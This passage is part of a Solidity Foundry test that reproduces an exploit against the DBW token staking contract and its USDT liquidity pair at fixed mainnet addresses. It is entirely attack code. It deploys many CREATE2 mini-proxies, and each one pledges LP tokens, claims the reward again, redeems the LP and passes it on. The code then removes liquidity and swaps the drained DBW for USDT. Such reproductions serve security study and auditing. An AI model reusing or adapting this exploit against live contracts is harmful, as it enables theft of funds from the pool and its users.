 bytes memory creationBytecode = getCreationBytecode(address(impl));
 address newImpl = getAddress(creationBytecode, _salt);
            Pair.transfer(newImpl, Pair.balanceOf(address(this)));
 // new miniProxy{salt: keccak256(""salt"")}(impl);
 deploy(creationBytecode, _salt);
            (uint256 USDTReserve, uint256 DBWReserve,) = Pair.getReserves();
 uint256 DBWInPairAmount = DBW.balanceOf(address(Pair));
 uint256 USDTTransferAmount = DBWInPairAmount * USDTReserve / DBWReserve - USDTReserve;
            USDT.transfer(address(Pair), USDTTransferAmount);
            Pair.mint(address(this));
        }
    }


 function RemoveLiquidity_DBWToUSDT() internal {
        Router.removeLiquidity(
 address(USDT), address(DBW), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );
 address[] memory path = new address[](2);
        path[0] = address(DBW);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DBW.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }


 function getCreationBytecode(address claimImpl) public pure returns (bytes memory) {
 bytes memory bytecode = type(miniProxy).creationCode;
 return abi.encodePacked(bytecode, abi.encode(claimImpl));
    }


 function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
 bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
 return address(uint160(uint256(hash)));
    }


 function deploy(bytes memory bytecode, uint256 _salt) internal {
 address addr;
 assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
        }
    }
}


contract claimRewardImpl is Test {
 function exploit() public {
        IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
        Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
        Pair.approve(address(DBW), type(uint256).max);
        DBW.getStaticIncome();
        vm.warp(block.timestamp + 2 * 24 * 60 * 60); // bypass locktime Limit
 uint256 LPAmount = Pair.balanceOf(address(this));
        DBW.pledge_lp(LPAmount); // send LP
        DBW.getStaticIncome(); // claim reward
        DBW.redemption_lp(LPAmount); // redeem LP
        Pair.transfer(msg.sender, LPAmount);
        DBW.transfer(address(Pair), DBW.balanceOf(address(this)));
    }
}


contract miniProxy {
 constructor(address claimRewardImpl) {
        (bool success,) = claimRewardImpl.delegatecall(abi.encodeWithSignature(""exploit()""));
 require(success);
 selfdestruct(payable(tx.origin));
    }
}",
